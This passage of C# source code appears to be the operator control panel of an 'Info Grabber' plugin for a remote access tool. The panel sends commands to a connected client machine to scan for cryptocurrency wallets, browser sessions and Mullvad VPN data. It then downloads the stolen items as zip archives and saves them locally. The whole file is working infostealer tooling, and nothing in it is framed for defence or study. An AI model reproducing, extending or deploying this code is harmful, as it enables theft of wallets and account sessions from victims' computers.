            walletSelectedHoverTrigger.Conditions.Add(new Condition(System.Windows.Controls.Primitives.Selector.IsSelectedProperty, true));
            walletSelectedHoverTrigger.Setters.Add(new Setter(Control.ForegroundProperty, TextPrimaryBrush));
            walletSelectedHoverTrigger.Setters.Add(new Setter(Control.BackgroundProperty, new SolidColorBrush(PrimaryHoverColorVal)));
            walletItemStyle.Triggers.Add(walletSelectedHoverTrigger);

            _walletList.ItemContainerStyle = walletItemStyle;

            Grid.SetRow(_walletList, 1);
            mainGrid.Children.Add(_walletList);

            // ===== LOG =====
            var logBorder = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushTheme,
                BorderThickness = new Thickness(0, 1, 0, 0)
            };

            var logGrid = new Grid();
            logGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            logGrid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });

            var logHeader = new Border
            {
                Background = SurfaceLightBrush,
                Padding = new Thickness(10, 6, 10, 6),
                BorderBrush = BorderBrushTheme,
                BorderThickness = new Thickness(0, 0, 0, 1)
            };
            logHeader.Child = new TextBlock
            {
                Text = "Activity Log",
                Foreground = TextSecondaryBrush,
                FontWeight = FontWeights.SemiBold,
                FontSize = 11
            };
            Grid.SetRow(logHeader, 0);
            logGrid.Children.Add(logHeader);

            _logBox = new TextBox
            {
                IsReadOnly = true,
                Background = Brushes.Transparent,
                Foreground = new SolidColorBrush(C("TextPrimaryColor")),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, monospace"),
                FontSize = 11,
                BorderThickness = new Thickness(0),
                Padding = new Thickness(10, 6, 10, 6),
                TextWrapping = TextWrapping.Wrap,
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                AcceptsReturn = true,
                Style = null
            };
            Grid.SetRow(_logBox, 1);
            logGrid.Children.Add(_logBox);

            logBorder.Child = logGrid;
            Grid.SetRow(logBorder, 2);
            mainGrid.Children.Add(logBorder);

            // ===== BOTTOM BAR =====
            var bottomBar = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushTheme,
                BorderThickness = new Thickness(0, 1, 0, 0),
                Padding = new Thickness(10, 6, 10, 6)
            };

            _summaryLabel = new TextBlock
            {
                Text = "No items scanned yet.",
                Foreground = TextSecondaryBrush,
                FontSize = 12,
                VerticalAlignment = VerticalAlignment.Center
            };
            bottomBar.Child = _summaryLabel;
            Grid.SetRow(bottomBar, 3);
            mainGrid.Children.Add(bottomBar);

            this.Content = mainGrid;
            this.Background = BackgroundBrush;
        }

        // ==================== THEME HELPERS ====================

        private static GridViewColumn CreateColumn(string header, string binding, double width)
        {
            return new GridViewColumn
            {
                Header = header,
                DisplayMemberBinding = new System.Windows.Data.Binding(binding),
                Width = width
            };
        }

        private Button CreateThemedButton(string text, Color normalBg, Color hoverBg)
        {
            var nb = new SolidColorBrush(normalBg); var hb = new SolidColorBrush(hoverBg);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = System.Windows.Controls.Primitives.ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp,                     Foreground = new SolidColorBrush(TextPrimaryColorVal), Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        private CheckBox CreateThemedCheckbox(string text, bool isChecked)
        {
            return new CheckBox
            {
                Content = text,
                IsChecked = isChecked,
                Foreground = TextSecondaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(8, 0, 0, 0),
                FontSize = 12,
                Cursor = Cursors.Hand
            };
        }

        private byte GetScanFlags()
        {
            byte flags = 0;
            if (_chkWallets.IsChecked == true) flags |= 0x01;
            if (_chkSessions.IsChecked == true) flags |= 0x02;
            if (_chkMullvad.IsChecked == true) flags |= 0x04;
            return flags;
        }

        private static string TruncateId(string id)
        {
            if (string.IsNullOrEmpty(id)) return "";
            return id.Length <= 16 ? id : id.Substring(0, 16) + "…";
        }

        // ==================== LOG ====================

        private void Log(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string ts = DateTime.Now.ToString("HH:mm:ss");
                _logBox.AppendText($"[{ts}] {message}\n");
                _logBox.ScrollToEnd();
            });
        }

        // ==================== BUTTON HANDLERS ====================

        private async void ScanButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady || _busy) return;
            SetBusy(true);
            _wallets.Clear();
            _walletList.ItemsSource = null;
            byte flags = GetScanFlags();
            Log($"Scanning (wallets={(flags & 0x01) != 0}, sessions={(flags & 0x02) != 0}, mullvad={(flags & 0x04) != 0})...");
            _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Scanning...";
            await _context.SendToClient(new byte[] { 0x01, flags });
        }

        private async void GrabAllButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady || _busy || _wallets.Count == 0) return;
            SetBusy(true);
            Log("Grabbing ALL detected items...");
            _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Grabbing all...";
            await _context.SendToClient(new byte[] { 0x03 });
        }

        private async void GrabSelectedButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady || _busy) return;

            var selected = _walletList.SelectedItems;
            if (selected == null || selected.Count == 0)
            {
                Log("No item selected.");
                return;
            }

            SetBusy(true);

            foreach (WalletInfo w in selected)
            {
                Log($"Grabbing {w.DisplayName}...");
                _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Grabbing {w.DisplayName}...";
                byte cmd = w.Category == "Session" ? (byte)0x0A : w.Category == "Mullvad" ? (byte)0x0B : (byte)0x02;
                byte idx = w.Index > 255 ? (byte)255 : (byte)w.Index;
                await _context.SendToClient(new byte[] { cmd, idx });
            }
        }

        private void SaveButton_Click(object sender, RoutedEventArgs e)
        {
            var selected = _walletList.SelectedItem as WalletInfo;
            if (selected == null || selected.ZipData == null || selected.ZipData.Length == 0)
            {
                Log("Select a grabbed item to save.");
                return;
            }

            SaveWalletZip(selected);
        }

        private void SaveAllButton_Click(object sender, RoutedEventArgs e)
        {
            var grabbed = _wallets.FindAll(w => w.Grabbed && w.ZipData != null && w.ZipData.Length > 0);
            if (grabbed.Count == 0)
            {
                Log("No grabbed items to save.");
                return;
            }

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "ZIP archive (*.zip)|*.zip",
                FileName = $"{TruncateId(_context.ClientId).Replace("…", "")}_all_items.zip",
                Title = "Choose save location (individual zips will be saved alongside)"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    string outputDir = Path.GetDirectoryName(dialog.FileName);
                    string baseName = Path.GetFileNameWithoutExtension(dialog.FileName);
                    int saved = 0;

                    foreach (var w in grabbed)
                    {
                        try
                        {
                            string safeName = MakeSafeFileName(w.DisplayName);
                            string fileName = $"{baseName}_{safeName}.zip";
                            string fullPath = Path.Combine(outputDir, fileName);

                            File.WriteAllBytes(fullPath, w.ZipData);
                            saved++;
                            Log($"Saved: {fullPath}");
                        }
                        catch (Exception ex)
                        {
                            Log($"Failed to save {w.DisplayName}: {ex.Message}");
                        }
                    }

                    Log($"Saved {saved}/{grabbed.Count} item zip(s) to {outputDir}");
                }
                catch (Exception ex)
                {
                    Log($"Save all failed: {ex.Message}");
                }
            }
        }

        private void SaveWalletZip(WalletInfo wallet)
        {
            string safeName = MakeSafeFileName(wallet.DisplayName);
            string clientShort = TruncateId(_context.ClientId).Replace("…", "");

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "ZIP archive (*.zip)|*.zip",
                FileName = $"{clientShort}_{safeName}.zip"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    File.WriteAllBytes(dialog.FileName, wallet.ZipData);
                    Log($"Saved: {dialog.FileName} ({FormatSize(wallet.ZipData.Length)})");
                }
                catch (Exception ex)
                {
                    Log($"Save failed: {ex.Message}");
                }
            }
        }

        private static string MakeSafeFileName(string name)
        {
            char[] invalid = Path.GetInvalidFileNameChars();
            var sb = new StringBuilder();
            foreach (char c in name)
            {
                sb.Append(Array.IndexOf(invalid, c) >= 0 ? '_' : c);
            }
            return sb.ToString();
        }

        private static string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + " B";
            if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("F1") + " KB";
            return (bytes / (1024.0 * 1024.0)).ToString("F1") + " MB";
        }

        // ==================== STATE ====================

        private void SetBusy(bool busy)
        {
            _busy = busy;
            Dispatcher.BeginInvoke(() =>
            {
                _scanButton.IsEnabled = _clientReady && !busy;
                _grabAllButton.IsEnabled = _clientReady && !busy && _wallets.Count > 0;
                _grabSelectedButton.IsEnabled = _clientReady && !busy && _wallets.Count > 0;
            });
        }

        private void UpdateSummary()
        {
            Dispatcher.BeginInvoke(() =>
            {
                int total = _wallets.Count;
                int wallets = _wallets.Count(w => w.Category == "Wallet");
                int sessions = _wallets.Count(w => w.Category == "Session");
                int mullvads = _wallets.Count(w => w.Category == "Mullvad");
                _summaryLabel.Text = $"{total} item(s)  |  {wallets}W {sessions}S {mullvads}M  |  {_totalGrabbed} grabbed  |  {FormatSize(_totalBytes)} downloaded";

                bool anyGrabbed = _wallets.Exists(w => w.Grabbed);
                _saveButton.IsEnabled = anyGrabbed;
                _saveAllButton.IsEnabled = anyGrabbed;
            });
        }

        private void RefreshList()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _walletList.ItemsSource = null;
                _walletList.ItemsSource = _wallets;
            });
        }

        // ==================== DATA HANDLERS ====================

        public void OnClientReady()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _clientReady = true;
                _scanButton.IsEnabled = true;
                _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Ready";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                Log("Client plugin ready. Click 'Scan Wallets' to begin.");
            });
        }

        public void OnWalletListReceived(string listText)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _wallets.Clear();
                _totalGrabbed = 0;
                _totalBytes = 0;

                if (!string.IsNullOrWhiteSpace(listText))
                {
                    string[] lines = listText.Split('\n');
                    foreach (string line in lines)
                    {
                        if (string.IsNullOrWhiteSpace(line)) continue;
                        string[] parts = line.Split('|');
                        if (parts.Length >= 5)
                        {
                            int.TryParse(parts[0], out int idx);
                            string typeId = parts[1];
                            string cat = "Wallet";
                            string id = typeId;
                            if (typeId.StartsWith("W:")) { cat = "Wallet"; id = typeId.Substring(2); }
                            else if (typeId.StartsWith("S:")) { cat = "Session"; id = typeId.Substring(2); }
                            else if (typeId.StartsWith("M:")) { cat = "Mullvad"; id = typeId.Substring(2); }
                            _wallets.Add(new WalletInfo
                            {
                                Index = idx,
                                Id = id,
                                Category = cat,
                                DisplayName = parts[2],
                                Path = parts[3],
                                Size = parts[4],
                                Status = "Detected",
                                Grabbed = false
                            });
                        }
                    }
                }

                RefreshList();
                SetBusy(false);
                UpdateSummary();

                if (_wallets.Count > 0)
                {
                    Log($"Found {_wallets.Count} item(s).");
                    _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — {_wallets.Count} item(s) found";
                    _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                }
                else
                {
                    Log("No items detected on client.");
                    _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — No items found";
                    _statusLabel.Foreground = new SolidColorBrush(WarningColorVal);
                }
            });
        }

        public void OnZipDataReceived(byte walletIdx, byte[] zipData)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var wallet = _wallets.Find(w => w.Index == walletIdx);
                if (wallet != null)
                {
                    wallet.ZipData = zipData;
                    wallet.Grabbed = true;
                    wallet.Status = $"? Grabbed ({FormatSize(zipData.Length)})";
                    _totalGrabbed++;
                    _totalBytes += zipData.Length;
                    Log($"Received {wallet.DisplayName}: {FormatSize(zipData.Length)}");
                    RefreshList();
                    UpdateSummary();
                }
            });
        }

        public void OnChunkedStart(byte walletIdx, int totalSize)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var wallet = _wallets.Find(w => w.Index == walletIdx);
                if (wallet != null)
                {
                    wallet.ChunkBuffer = new MemoryStream();
                    wallet.ExpectedSize = totalSize;
                    wallet.Status = $"Downloading... (0/{FormatSize(totalSize)})";
                    Log($"Starting chunked download for {wallet.DisplayName} ({FormatSize(totalSize)})");
                    RefreshList();
                }
            });
        }

        public void OnChunkReceived(byte walletIdx, byte[] chunk)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var wallet = _wallets.Find(w => w.Index == walletIdx);
                if (wallet?.ChunkBuffer != null)
                {
                    wallet.ChunkBuffer.Write(chunk, 0, chunk.Length);
                    long received = wallet.ChunkBuffer.Length;
                    wallet.Status = $"Downloading... ({FormatSize(received)}/{FormatSize(wallet.ExpectedSize)})";
                    RefreshList();
                }
            });
        }

        public void OnChunkedDone(byte walletIdx)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var wallet = _wallets.Find(w => w.Index == walletIdx);
                if (wallet?.ChunkBuffer != null)
                {
                    wallet.ZipData = wallet.ChunkBuffer.ToArray();
                    wallet.ChunkBuffer.Dispose();
                    wallet.ChunkBuffer = null;
                    wallet.Grabbed = true;
                    wallet.Status = $"? Grabbed ({FormatSize(wallet.ZipData.Length)})";
                    _totalGrabbed++;
                    _totalBytes += wallet.ZipData.Length;
                    Log($"Received {wallet.DisplayName}: {FormatSize(wallet.ZipData.Length)}");
                    RefreshList();
                    UpdateSummary();
                }
            });
        }

        public void OnWalletStatus(byte walletIdx, string status)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var wallet = _wallets.Find(w => w.Index == walletIdx);
                if (wallet != null)
                {
                    wallet.Status = status;
                    Log($"[{wallet.DisplayName}] {status}");
                    RefreshList();
                }
            });
        }

        public void OnError(string error)
        {
            Dispatcher.BeginInvoke(() =>
            {
                Log($"ERROR: {error}");
                _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Error";
                _statusLabel.Foreground = new SolidColorBrush(DangerColorVal);
                SetBusy(false);
            });
        }

        public void OnAllDone()
        {
            Dispatcher.BeginInvoke(() =>
            {
                SetBusy(false);
                _statusLabel.Text = $"Info Grabber — {TruncateId(_context.ClientId)} — Complete";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColorVal);
                Log($"All operations complete. {_totalGrabbed} item(s) grabbed, {FormatSize(_totalBytes)} total.");
                UpdateSummary();
            });
        }

        public void Dispose()
        {
            foreach (var w in _wallets)
            {
                w.ChunkBuffer?.Dispose();
            }
        }
    }
}